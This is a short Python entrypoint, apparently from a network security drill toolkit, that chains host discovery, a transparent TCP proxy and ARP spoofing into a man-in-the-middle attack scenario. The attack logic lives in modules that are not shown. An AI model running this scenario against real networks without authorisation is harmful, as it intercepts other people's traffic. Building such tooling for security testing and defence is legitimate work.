"""
Scenario entrypoint for MITM with arp spoofing and transparent tcp proxy.
"""
import dataclasses
from typing import Any

from nsak.core import DrillManager, get_target_network_interfaces
from nsak.core.network import NetworkDiscoveryResultMap


def run(network_interfaces: list[str] | None = None, *args: Any, **kwargs: Any) -> None:
    """
    Scenario, which runs MITM attack, based on arp spoofing.

    :return: None
    """

    if not network_interfaces:
        network_interfaces = get_target_network_interfaces()

    network_discovery_result_map: NetworkDiscoveryResultMap = DrillManager.execute(
        "discover_hosts",
        network_interfaces=network_interfaces,
    )
    print(network_discovery_result_map.display())
    DrillManager.execute(
        "transparent_tcp_proxy",
        network_discovery_result_map=network_discovery_result_map,
    )
    DrillManager.execute(
        "arp_spoof",
        network_discovery_result_map=network_discovery_result_map
    )
